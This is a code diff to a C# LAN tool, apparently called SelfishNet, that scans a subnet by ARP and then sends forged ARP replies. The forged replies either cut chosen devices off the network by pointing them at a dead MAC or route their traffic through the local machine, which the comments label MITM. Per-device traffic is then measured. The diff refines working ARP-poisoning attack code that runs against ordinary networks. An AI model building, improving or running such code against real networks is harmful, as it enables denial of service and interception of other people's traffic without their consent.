@@ -15,6 +15,9 @@ namespace SelfishNet
         private volatile bool _isDiscovering;
         private volatile bool _isMonitoringTraffic;
 
+        private readonly object _pcapSendLock = new();
+        private readonly HashSet<IPAddress> _activeSpoofedIps = new();
+
         private PcList _pcList;
         private LibPcapLiveDevice _device;
         private LibPcapLiveDevice _trafficDevice;
@@ -94,6 +97,40 @@ namespace SelfishNet
             }
 
             BroadcastMac = new byte[] { 255, 255, 255, 255, 255, 255 };
+
+            // Explicitly register local PC in device list (IsLocalPc = true)
+            if (LocalIp != null && LocalMac != null)
+            {
+                PC localPc = new PC
+                {
+                    Ip = new IPAddress(LocalIp),
+                    Mac = new PhysicalAddress(LocalMac),
+                    IsLocalPc = true,
+                    Name = Environment.MachineName,
+                    DeviceCategory = DeviceType.Desktop,
+                    Vendor = OuiDatabase.Lookup(LocalMac) ?? "Local Host"
+                };
+                _pcList.AddDevice(localPc);
+            }
+        }
+
+        /// <summary>
+        /// Sends a raw packet serialized under _pcapSendLock to ensure thread-safety on LibPcapLiveDevice.
+        /// </summary>
+        public void SendPacketLocked(byte[] packet)
+        {
+            if (packet == null || _device == null || !_device.Opened) return;
+            lock (_pcapSendLock)
+            {
+                try
+                {
+                    _device.SendPacket(packet);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[PCAP SEND ERROR] {ex.Message}");
+                }
+            }
         }
 
         // ──────────────────────────────────────────────
@@ -123,40 +160,58 @@ namespace SelfishNet
 
         private void ArpListenerLoop()
         {
-            _device.Filter = "arp";
-            while (_isListeningArp)
+            try
             {
-                PacketCapture pCapture;
-                var status = _device.GetNextPacket(out pCapture);
-                if (status != GetPacketStatus.PacketRead) continue;
-
-                var rawPacket = pCapture.GetPacket().Data;
-                if (rawPacket.Length < 42) continue;
-
-                byte[] srcMac = new byte[6];
-                Array.Copy(rawPacket, 6, srcMac, 0, 6);
-                if (Tools.AreValuesEqual(srcMac, LocalMac)) continue;
-
-                if (rawPacket[21] == 2)
+                _device.Filter = "arp";
+                while (_isListeningArp)
                 {
-                    byte[] senderIp = new byte[4];
-                    byte[] senderMac = new byte[6];
-                    Array.Copy(rawPacket, 22, senderMac, 0, 6);
-                    Array.Copy(rawPacket, 28, senderIp, 0, 4);
+                    PacketCapture pCapture;
+                    var status = _device.GetNextPacket(out pCapture);
+                    if (status != GetPacketStatus.PacketRead) continue;
 
-                    PC newPc = new PC();
-                    newPc.Ip = new IPAddress(senderIp);
-                    newPc.Mac = new PhysicalAddress(senderMac);
-                    newPc.IsGateway = Tools.AreValuesEqual(senderIp, RouterIp);
+                    var rawPacket = pCapture.GetPacket()?.Data;
+                    if (rawPacket == null || rawPacket.Length < 42) continue;
 
-                    newPc.Redirect = true;
+                    byte[] srcMac = new byte[6];
+                    Array.Copy(rawPacket, 6, srcMac, 0, 6);
+                    if (Tools.AreValuesEqual(srcMac, LocalMac)) continue;
 
-                    if (newPc.IsGateway) RouterMac = senderMac;
-
-                    if (_pcList.AddDevice(newPc))
+                    // Learn from both ARP Request (1) and ARP Reply (2)
+                    if (rawPacket[21] == 1 || rawPacket[21] == 2)
                     {
-                        Console.WriteLine($"[DETECTED] IP: {newPc.Ip} MAC: {newPc.Mac}");
+                        byte[] senderIp = new byte[4];
+                        byte[] senderMac = new byte[6];
+                        Array.Copy(rawPacket, 22, senderMac, 0, 6);
+                        Array.Copy(rawPacket, 28, senderIp, 0, 4);
+
+                        bool isGateway = Tools.AreValuesEqual(senderIp, RouterIp);
+                        if (isGateway && (RouterMac == null || !Tools.AreValuesEqual(RouterMac, senderMac)))
+                        {
+                            RouterMac = senderMac;
+                        }
+
+                        bool isLocal = Tools.AreValuesEqual(senderIp, LocalIp);
+
+                        PC newPc = new PC
+                        {
+                            Ip = new IPAddress(senderIp),
+                            Mac = new PhysicalAddress(senderMac),
+                            IsGateway = isGateway,
+                            IsLocalPc = isLocal
+                        };
+
+                        if (_pcList.AddDevice(newPc))
+                        {
+                            Console.WriteLine($"[DETECTED] IP: {newPc.Ip} MAC: {newPc.Mac} {(isGateway ? "(Gateway)" : "")}");
+                        }
                     }
+                }
+            }
+            catch (Exception ex)
+            {
+                if (_isListeningArp)
+                {
+                    Console.WriteLine($"[ARP LISTENER ERROR] {ex.Message}");
                 }
             }
         }
@@ -188,44 +243,55 @@ namespace SelfishNet
 
         private void DiscoveryLoop()
         {
-            // Discover gateway first (3 attempts)
-            if (RouterIp != null)
+            try
             {
-                for (int k = 0; k < 3; k++)
+                // Discover gateway first (3 attempts)
+                if (RouterIp != null)
                 {
-                    SendArpRequest(new IPAddress(RouterIp));
-                    Thread.Sleep(100);
+                    for (int k = 0; k < 3 && _isDiscovering; k++)
+                    {
+                        SendArpRequest(new IPAddress(RouterIp));
+                        Thread.Sleep(50);
+                    }
+                }
+
+                // Calculate network range based on real subnet mask
+                byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
+                byte[] broadcastAddr = GetBroadcastAddress(LocalIp, SubnetMask);
+                uint networkUint = BytesToUint(networkAddr);
+                uint broadcastUint = BytesToUint(broadcastAddr);
+
+                uint totalHosts = broadcastUint > networkUint ? broadcastUint - networkUint - 1 : 0;
+                uint maxHosts = Math.Min(totalHosts, 1024);
+
+                Console.WriteLine($"[DISCOVERY] Network: {new IPAddress(networkAddr)} " +
+                                  $"Broadcast: {new IPAddress(broadcastAddr)} " +
+                                  $"Hosts to scan: {maxHosts}/{totalHosts}");
+
+                for (uint offset = 1; offset <= maxHosts && _isDiscovering; offset++)
+                {
+                    uint targetUint = networkUint + offset;
+                    byte[] targetBytes = UintToBytes(targetUint);
+
+                    if (Tools.AreValuesEqual(targetBytes, LocalIp)) continue;
+                    if (RouterIp != null && Tools.AreValuesEqual(targetBytes, RouterIp)) continue;
+
+                    IPAddress target = new IPAddress(targetBytes);
+                    SendArpRequest(target);
+                    Thread.Sleep(5);
                 }
             }
-
-            // Calculate network range based on real subnet mask
-            byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
-            byte[] broadcastAddr = GetBroadcastAddress(LocalIp, SubnetMask);
-            uint networkUint = BytesToUint(networkAddr);
-            uint broadcastUint = BytesToUint(broadcastAddr);
-
-            uint totalHosts = broadcastUint - networkUint - 1;
-            uint maxHosts = Math.Min(totalHosts, 1024);
-
-            Console.WriteLine($"[DISCOVERY] Network: {new IPAddress(networkAddr)} " +
-                              $"Broadcast: {new IPAddress(broadcastAddr)} " +
-                              $"Hosts to scan: {maxHosts}/{totalHosts}");
-
-            for (uint offset = 1; offset <= maxHosts; offset++)
+            catch (Exception ex)
             {
-                if (!_isDiscovering) break;
-
-                uint targetUint = networkUint + offset;
-                byte[] targetBytes = UintToBytes(targetUint);
-                IPAddress target = new IPAddress(targetBytes);
-
-                if (Tools.AreValuesEqual(targetBytes, LocalIp)) continue;
-                if (RouterIp != null && Tools.AreValuesEqual(targetBytes, RouterIp)) continue;
-
-                SendArpRequest(target);
-                Thread.Sleep(10);
+                if (_isDiscovering)
+                {
+                    Console.WriteLine($"[DISCOVERY ERROR] {ex.Message}");
+                }
             }
-            _isDiscovering = false;
+            finally
+            {
+                _isDiscovering = false;
+            }
         }
 
         // ──────────────────────────────────────────────
@@ -264,40 +330,94 @@ namespace SelfishNet
             // Dead MAC used to block devices — packets sent here go nowhere
             byte[] deadMac = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
 
-            while (_isSpoofing)
+            try
             {
-                IReadOnlyList<PC> snapshot = _pcList.Devices;
-                for (int i = 0; i < snapshot.Count; i++)
+                while (_isSpoofing)
                 {
-                    if (!_isSpoofing) break;
-                    PC target = snapshot[i];
+                    IReadOnlyList<PC> snapshot = _pcList.Devices;
+                    HashSet<IPAddress> currentSpoofedThisCycle = new();
 
-                    if (target.IsLocalPc || target.IsGateway) continue;
-
-                    if (target.Block)
+                    for (int i = 0; i < snapshot.Count; i++)
                     {
-                        // BLOCK: Tell the device the gateway is at a dead MAC
-                        // Device will try to send packets there → they go nowhere
-                        SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
-                                    deadMac, RouterIp);
-                        // Also tell the router this device is at a dead MAC
-                        SendArpReply(RouterMac, RouterIp,
-                                    deadMac, target.Ip.GetAddressBytes());
+                        if (!_isSpoofing) break;
+                        PC target = snapshot[i];
+
+                        if (target.IsLocalPc || target.IsGateway || target.Mac == null || target.Ip == null) continue;
+
+                        if (target.Block)
+                        {
+                            currentSpoofedThisCycle.Add(target.Ip);
+                            // BLOCK: Tell the device the gateway is at a dead MAC
+                            SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
+                                        deadMac, RouterIp);
+                            // Also tell the router this device is at a dead MAC
+                            SendArpReply(RouterMac, RouterIp,
+                                        deadMac, target.Ip.GetAddressBytes());
+                        }
+                        else if (target.Redirect)
+                        {
+                            currentSpoofedThisCycle.Add(target.Ip);
+                            // REDIRECT: Route traffic through us (MITM)
+                            SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
+                                        LocalMac, RouterIp);
+                            SendArpReply(RouterMac, RouterIp,
+                                        LocalMac, target.Ip.GetAddressBytes());
+                        }
                     }
-                    else if (target.Redirect)
+
+                    // Check for devices that had Block/Redirect unchecked and restore them immediately
+                    lock (_activeSpoofedIps)
                     {
-                        // REDIRECT: Route traffic through us (MITM)
-                        SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
-                                    LocalMac, RouterIp);
-                        SendArpReply(RouterMac, RouterIp,
-                                    LocalMac, target.Ip.GetAddressBytes());
+                        foreach (var prevIp in _activeSpoofedIps)
+                        {
+                            if (!currentSpoofedThisCycle.Contains(prevIp))
+                            {
+                                PC unpoisonTarget = _pcList.GetDeviceByIp(prevIp);
+                                if (unpoisonTarget != null)
+                                {
+                                    SendRestoreForDevice(unpoisonTarget);
+                                }
+                            }
+                        }
+                        _activeSpoofedIps.Clear();
+                        foreach (var ip in currentSpoofedThisCycle)
+                        {
+                            _activeSpoofedIps.Add(ip);
+                        }
+                    }
+
+                    // Sleep cooperatively in short slices for fast shutdown
+                    for (int s = 0; s < 20 && _isSpoofing; s++)
+                    {
+                        Thread.Sleep(100);
                     }
                 }
-                Thread.Sleep(2000);
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[SPOOF ERROR] {ex.Message}");
+            }
+            finally
+            {
+                RestoreArpTables();
+            }
+        }
 
-            // Restore real gateway MAC for all devices when stopping
-            RestoreArpTables();
+        /// <summary>
+        /// Sends immediate ARP replies to restore the real gateway and device MAC for an unpoisoned device.
+        /// </summary>
+        public void SendRestoreForDevice(PC target)
+        {
+            if (target == null || target.Mac == null || target.Ip == null || RouterMac == null || RouterIp == null) return;
+            byte[] targetMac = target.Mac.GetAddressBytes();
+            byte[] targetIp = target.Ip.GetAddressBytes();
+
+            for (int k = 0; k < 3; k++)
+            {
+                SendArpReply(targetMac, targetIp, RouterMac, RouterIp);
+                SendArpReply(RouterMac, RouterIp, targetMac, targetIp);
+            }
+            Console.WriteLine($"[RESTORED] Instant ARP restore sent for {target.Ip} ({target.Mac})");
         }
 
         /// <summary>
@@ -313,7 +433,7 @@ namespace SelfishNet
             {
                 foreach (PC target in snapshot)
                 {
-                    if (target.IsLocalPc || target.IsGateway) continue;
+                    if (target.IsLocalPc || target.IsGateway || target.Mac == null || target.Ip == null) continue;
 
                     // Tell device the real gateway MAC
                     SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
@@ -322,7 +442,12 @@ namespace SelfishNet
                     SendArpReply(RouterMac, RouterIp,
                                 target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes());
                 }
-                Thread.Sleep(500);
+                Thread.Sleep(100);
+            }
+
+            lock (_activeSpoofedIps)
+            {
+                _activeSpoofedIps.Clear();
             }
             Console.WriteLine("[INFO] ARP tables restored.");
         }
@@ -342,7 +467,6 @@ namespace SelfishNet
                 try
                 {
                     // Open a SEPARATE device handle to avoid filter conflicts
-                    // ARP listener uses Filter="arp" on _device, so we need our own
                     _trafficDevice = new LibPcapLiveDevice(_device.Interface);
                     _trafficDevice.Open(DeviceModes.Promiscuous, 100);
                     _trafficDevice.Filter = "ip"; // Only IP packets
@@ -388,11 +512,21 @@ namespace SelfishNet
                         continue;
                     }
 
-                    // Reset counters for this cycle
+                    // Reset counters for this cycle and build fast O(1) integer IP map
+                    var ipToPc = new Dictionary<uint, PC>();
                     foreach (PC pc in snapshot)
                     {
                         pc.BytesReceived = 0;
                         pc.BytesSent = 0;
+                        if (pc.Ip != null)
+                        {
+                            byte[] ipBytes = pc.Ip.GetAddressBytes();
+                            if (ipBytes.Length == 4)
+                            {
+                                uint key = (uint)((ipBytes[0] << 24) | (ipBytes[1] << 16) | (ipBytes[2] << 8) | ipBytes[3]);
+                                ipToPc[key] = pc;
+                            }
+                        }
                     }
 
                     // Capture for 1 second using the dedicated traffic device
@@ -403,54 +537,25 @@ namespace SelfishNet
                         var status = _trafficDevice.GetNextPacket(out pCapture);
                         if (status != GetPacketStatus.PacketRead) continue;
 
-                        var raw = pCapture.GetPacket().Data;
-                        if (raw.Length < 34) continue;
+                        var raw = pCapture.GetPacket()?.Data;
+                        if (raw == null || raw.Length < 34) continue;
 
                         // Check for IP packet (EtherType 0x0800)
                         if (raw[12] != 0x08 || raw[13] != 0x00) continue;
 
-                        // Extract Ethernet MACs (for secondary matching)
-                        byte[] ethDstMac = new byte[6];
-                        byte[] ethSrcMac = new byte[6];
-                        Array.Copy(raw, 0, ethDstMac, 0, 6);
-                        Array.Copy(raw, 6, ethSrcMac, 0, 6);
-
-                        // Extract IP addresses
-                        byte[] srcIp = new byte[4];
-                        byte[] dstIp = new byte[4];
-                        Array.Copy(raw, 26, srcIp, 0, 4);
-                        Array.Copy(raw, 30, dstIp, 0, 4);
+                        uint srcIpUint = (uint)((raw[26] << 24) | (raw[27] << 16) | (raw[28] << 8) | raw[29]);
+                        uint dstIpUint = (uint)((raw[30] << 24) | (raw[31] << 16) | (raw[32] << 8) | raw[33]);
 
                         int packetSize = raw.Length;
 
-                        // Try IP-based matching first (primary), then MAC-based (fallback)
-                        foreach (PC pc in snapshot)
+                        // Fast O(1) matching by integer IP
+                        if (ipToPc.TryGetValue(srcIpUint, out var srcPc))
                         {
-                            byte[] pcIpBytes = pc.Ip.GetAddressBytes();
-                            byte[] pcMacBytes = pc.Mac?.GetAddressBytes();
-
-                            // Primary: match by IP
-                            if (Tools.AreValuesEqual(pcIpBytes, srcIp))
-                            {
-                                pc.BytesSent += packetSize;
-                            }
-                            else if (Tools.AreValuesEqual(pcIpBytes, dstIp))
-                            {
-                                pc.BytesReceived += packetSize;
-                            }
-                            // Fallback: match by Ethernet MAC when IP doesn't match
-                            // This catches traffic from devices with changed IPs
-                            else if (pcMacBytes != null)
-                            {
-                                if (Tools.AreValuesEqual(pcMacBytes, ethSrcMac))
-                                {
-                                    pc.BytesSent += packetSize;
-                                }
-                                else if (Tools.AreValuesEqual(pcMacBytes, ethDstMac))
-                                {
-                                    pc.BytesReceived += packetSize;
-                                }
-                            }
+                            srcPc.BytesSent += packetSize;
+                        }
+                        if (ipToPc.TryGetValue(dstIpUint, out var dstPc))
+                        {
+                            dstPc.BytesReceived += packetSize;
                         }
                     }
 
@@ -459,13 +564,20 @@ namespace SelfishNet
                     {
                         double downloadKBs = pc.BytesReceived / 1024.0;
                         double uploadKBs = pc.BytesSent / 1024.0;
-                        pc.DownloadSpeed = $"↓{FormatSpeed(downloadKBs)} ↑{FormatSpeed(uploadKBs)}";
+                        string speed = $"↓{FormatSpeed(downloadKBs)} ↑{FormatSpeed(uploadKBs)}";
+                        if (pc.DownloadSpeed != speed)
+                        {
+                            pc.DownloadSpeed = speed;
+                        }
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[TRAFFIC ERROR] {ex.Message}");
+                if (_isMonitoringTraffic)
+                {
+                    Console.WriteLine($"[TRAFFIC ERROR] {ex.Message}");
+                }
             }
         }
 
@@ -482,36 +594,24 @@ namespace SelfishNet
 
         public void SendArpRequest(IPAddress targetIp)
         {
+            if (targetIp == null || LocalMac == null || LocalIp == null) return;
             byte[] packet = BuildArpPacket(
                 BroadcastMac, LocalMac, 1,
                 LocalMac, LocalIp,
                 new byte[6], targetIp.GetAddressBytes()
             );
-            try
-            {
-                _device.SendPacket(packet);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[ARP ERROR] SendArpRequest failed for {targetIp}: {ex.Message}");
-            }
+            SendPacketLocked(packet);
         }
 
         public void SendArpReply(byte[] destMac, byte[] destIp, byte[] srcMac, byte[] srcIp)
         {
+            if (destMac == null || destIp == null || srcMac == null || srcIp == null || LocalMac == null) return;
             byte[] packet = BuildArpPacket(
                 destMac, LocalMac, 2,
                 srcMac, srcIp,
                 destMac, destIp
             );
-            try
-            {
-                _device.SendPacket(packet);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[ARP ERROR] SendArpReply failed: {ex.Message}");
-            }
+            SendPacketLocked(packet);
         }
 
         public byte[] BuildArpPacket(byte[] destMac, byte[] srcMac, short arpType,
